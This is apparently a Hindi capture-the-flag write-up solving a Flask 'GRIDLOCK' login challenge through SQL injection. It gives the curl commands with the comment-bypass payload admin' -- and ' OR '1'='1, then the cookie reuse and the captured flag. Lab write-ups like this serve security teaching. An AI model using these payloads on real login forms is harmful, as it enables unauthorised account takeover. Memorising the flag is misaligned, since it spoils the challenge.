## 📌 कार्य

http://159.194.244.226:8081/ — gunicorn/Flask पर चलने वाला "GRIDLOCK" ऑपरेटर कंसोल। एक लॉगिन फ़ॉर्म; अंदर "admin के रूप में" घुसना है।

## 🏁 समाधान

पासवर्ड ब्रूट-फ़ोर्स करने की ज़रूरत नहीं पड़ी: `/login` हैंडलर में डेटाबेस क्वेरी स्ट्रिंग के रूप में जोड़ी जाती है, इसलिए दोनों फ़ील्ड इंजेक्टेबल हैं। एक सामान्य कमेंट बायपास:

```bash
curl -i -c jar.txt -d "username=admin' --&password=x" \
     http://159.194.244.226:8081/login
# 302 Location: /console + Flask सेशन कुकी
```

`--` ने क्वेरी के बाक़ी हिस्से को कमेंट कर दिया, पासवर्ड जाँच हट गई, और सर्वर ने users टेबल की पहली पंक्ति लौटा दी — यानी admin (uid=1, role=admin)। कुकी डिकोड होकर `{"role":"admin","uid":1,"username":"admin"}` बनती है। इसके बाद मैं बस इस कुकी के साथ कंसोल खोलता हूँ:

```bash
curl -b jar.txt http://159.194.244.226:8081/console
# ... kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}
```

छोटी-छोटी बातें: `admin' #` काम नहीं करता — SQLite में `#` कमेंट नहीं है; पासवर्ड फ़ील्ड में `' OR '1'='1` चल जाता है। सेवा पर कोई और सुराग़ नहीं है: `/admin`, `/api`, `/.git/HEAD` पर 404, `?lang=` में कुछ दिलचस्प नहीं, और रिस्पॉन्स टाइम भी एकसमान है।
